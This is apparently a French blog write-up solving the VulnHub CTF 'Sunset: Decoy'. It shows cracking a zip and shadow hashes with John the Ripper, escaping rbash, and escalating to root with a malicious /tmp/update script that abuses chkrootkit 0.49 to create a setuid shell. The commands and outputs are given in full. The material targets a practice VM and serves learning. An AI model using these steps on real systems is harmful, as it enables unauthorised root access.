---
title: "Solution du CTF Sunset: Decoy VulnHub"
tags: [CTF, VulnHub]
---

Le CTF [Sunset: Decoy](https://vulnhub.com/entry/sunset-decoy,505/) était amusant. Certes l'escalade de privilège se base sur un logiciel déjà croisé sur d'autres CTFs mais le fait qu'on puisse pour une fois le déclencher nous même était inattendu.

Sur cette VM on a un port 80 en écoute avec un listing de fichiers présent. Il se trouve qu'il n'y a qu'une archive nommée `save.zip` qui, sans surprise, est protégée par mot de passe.

On lance donc l'habituel `zip2john` pour générer un hash que l'on casse avec l'indémodable `JtR` :

```console
$ john --wordlist=rockyou.txt hashes.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, 'h' for help, almost any other key for status
manuel           (save.zip)     
1g 0:00:00:00 DONE (2023-04-08 22:20) 16.66g/s 136533p/s 136533c/s 136533C/s 123456..toodles
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

On trouve différents fichiers du système dans cette archive, mais surtout `passwd` et `shadow`.

```
Archive:  save.zip
  Length      Date    Time    Name
---------  ---------- -----   ----
     1807  2020-06-28 00:05   etc/passwd
     1111  2020-07-07 22:26   etc/shadow
      829  2020-06-27 23:40   etc/group
      669  2020-02-02 08:41   etc/sudoers
      185  2020-06-27 22:58   etc/hosts
       33  2020-06-27 23:39   etc/hostname
---------                     -------
     4634                     6 files
```

On relance donc `JtR` pour casser les hashes des utilisateurs et on obtient rapidement le mot de passe `server` pour l'utilisateur `296640a3b825115a47b68fc44501c828`.

Sans surprise à la connexion, on se retrouve face à un `rbash` (qu'on pouvait voir dans la ligne du fichier `passwd` pour cet utilisateur) :

```console
$ ssh 296640a3b825115a47b68fc44501c828@192.168.56.164
296640a3b825115a47b68fc44501c828@192.168.56.164's password: 
Linux 60832e9f188106ec5bcc4eb7709ce592 4.19.0-9-amd64 #1 SMP Debian 4.19.118-2+deb10u1 (2020-06-07) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Tue Jul  7 16:45:50 2020 from 192.168.1.162
-rbash: dircolors: command not found
296640a3b825115a47b68fc44501c828@60832e9f188106ec5bcc4eb7709ce592:~$ ls
honeypot.decoy  honeypot.decoy.cpp  id  ifconfig  ls  mkdir  SV-502  user.txt
296640a3b825115a47b68fc44501c828@60832e9f188106ec5bcc4eb7709ce592:~$ cat user.txt
-rbash: cat: command not found
296640a3b825115a47b68fc44501c828@60832e9f188106ec5bcc4eb7709ce592:~$ echo $PATH
PATH:/home/296640a3b825115a47b68fc44501c828/
296640a3b825115a47b68fc44501c828@60832e9f188106ec5bcc4eb7709ce592:~$ export PATH=/usr/local/bin:/usr/bin:/bin:/sbin:/usr/sbin:/home/296640a3b825115a47b68fc44501c828/
-rbash: PATH: readonly variable
```

`rbash` est un shell restreint. Ici on voit qu'il ne nous permet que d'exécuter les binaires présents dans le dossier courant.

On va donc le prendre au pied de la lettre. Pour cela je me sers de `scp` pour copier `/bin/bash` sur ma machine puis dans le sens inverse de ma machine vers le dossier de l'utilisateur.

Il me suffit alors d'appeler `bash` et de corriger le `PATH`. Ce `rbash` est désormais de l'histoire ancienne.

Il y a un binaire custom dont on ne peut lire le code source :

```
-rwxr-xr-x 1 root                             root                               17480 Jul  7  2020 honeypot.decoy
-rw------- 1 root                             root                                1855 Jul  7  2020 honeypot.decoy.cpp
```

Toutefois, on peut se faire une petite idée de son utilité en regardant dans le binaire (commande `strings`) :

```
libc.so.6
__cxa_atexit
system
__cxa_finalize
__libc_start_main
GLIBCXX_3.4
GLIBC_2.2.5
u/UH
[]A\A]A^A_
Welcome to the Honey Pot administration manager (HPAM). Please select an option.
1 Date.
2 Calendar.
3 Shutdown.
4 Reboot.
5 Launch an AV Scan.
6 Check /etc/passwd.
7 Leave a note.
8 Check all services status.
Option selected:
No available option was selected. Ending program.
/usr/bin/date
/usr/bin/cal
Shutdown is currently not available due to not enough privileges. Ending program.
Rebooting is currently not available due to not enough privileges. Ending program.
/usr/bin/touch /dev/shm/STTY5246
The AV Scan will be launched in a minute or less.
/usr/bin/cat /etc/passwd
/usr/bin/vi /tmp/cmFuZG9tc2Zvc2FuZm9kYW52cw==
/usr/sbin/service apache2 status
```

Le programme n'étant pas setuid, il semble peu intéressant pour le moment.

Dans le dossier `SV-502` je trouve un fichier `log.txt` qui correspond à un output de l'outil de surveillance de processus `pspy`.

La ligne la plus intéressante est la mention de c`hkrootkit 0.49` :

```
2020/06/27 18:56:58 CMD: UID=0    PID=12386  | tar -xvzf chkrootkit-0.49.tar.gz
```

J'ai exploité ce programme vulnérable notamment sur le CTF [Fuku]({% link _posts/2023-01-04-Solution-du-CTF-SecTalks-BNE0x02-Fuku-de-VulnHub.md %}).

L'idée est de placer un script nommé `update` qui sera exécuté lorsque `chkrootkit` est appelé. J'ai donc édité le même script que les dernières fois.

```console
296640a3b825115a47b68fc44501c828@60832e9f188106ec5bcc4eb7709ce592:~$ vi /tmp/update
296640a3b825115a47b68fc44501c828@60832e9f188106ec5bcc4eb7709ce592:~$ chmod 755 /tmp/update
296640a3b825115a47b68fc44501c828@60832e9f188106ec5bcc4eb7709ce592:~$ cat /tmp/update
#!/bin/bash
cp /usr/bin/dash /tmp/devloop_was_here
chmod 4755 /tmp/devloop_was_here
```

Mais après quelques minutes, nada.... C'est sans doute le moment d'utiliser le binaire vu plus tôt :

```console
296640a3b825115a47b68fc44501c828@60832e9f188106ec5bcc4eb7709ce592:~$ ./honeypot.decoy 
--------------------------------------------------

Welcome to the Honey Pot administration manager (HPAM). Please select an option.
1 Date.
2 Calendar.
3 Shutdown.
4 Reboot.
5 Launch an AV Scan.
6 Check /etc/passwd.
7 Leave a note.
8 Check all services status.

Option selected:5

The AV Scan will be launched in a minute or less.
--------------------------------------------------
296640a3b825115a47b68fc44501c828@60832e9f188106ec5bcc4eb7709ce592:~$ ls /dev/shm/STTY5246
/dev/shm/STTY5246
```

L'option 5 a visiblement provoqué la création du fichier `/dev/shm/STTY5246`.

Et cette fois `chkrootkit` a bien été lancé, nous ouvrant la porte du compte root :

```console
296640a3b825115a47b68fc44501c828@60832e9f188106ec5bcc4eb7709ce592:~$ ls -al /tmp/devloop_was_here
-rwsr-xr-x 1 root root 121464 Apr  8 16:51 /tmp/devloop_was_here
296640a3b825115a47b68fc44501c828@60832e9f188106ec5bcc4eb7709ce592:~$ /tmp/devloop_was_here -p
# id
uid=1000(296640a3b825115a47b68fc44501c828) gid=1000(296640a3b825115a47b68fc44501c828) euid=0(root) groups=1000(296640a3b825115a47b68fc44501c828)
# cd /root
# ls
chkrootkit-0.49  chkrootkit-0.49.tar.gz  log.txt  pspy  root.txt  script.sh
# cat root.txt
  ........::::::::::::..           .......|...............::::::::........
     .:::::;;;;;;;;;;;:::::.... .     \   | ../....::::;;;;:::::.......
         .       ...........   / \\_   \  |  /     ......  .     ........./\
...:::../\\_  ......     ..._/'   \\\_  \###/   /\_    .../ \_.......   _//
.::::./   \\\ _   .../\    /'      \\\\#######//   \/\   //   \_   ....////
    _/      \\\\   _/ \\\ /  x       \\\\###////      \////     \__  _/////
  ./   x       \\\/     \/ x X           \//////                   \/////
 /     XxX     \\/         XxX X                                    ////   x
-----XxX-------------|-------XxX-----------*--------|---*-----|------------X--
       X        _X      *    X      **         **             x   **    *  X
      _X                    _X           x                *          x     X_


1c203242ab4b4509233ca210d50d2cc5

Thanks for playing! - Felipe Winsnes (@whitecr0wz)
```

Le script qui était lancé par la crontab est le suivant :

```bash
FILE=/dev/shm/STTY5246
if test -f "$FILE"; then
    /root/chkrootkit-0.49/chkrootkit
else
    echo "An AV scan will not be launched."
fi
```
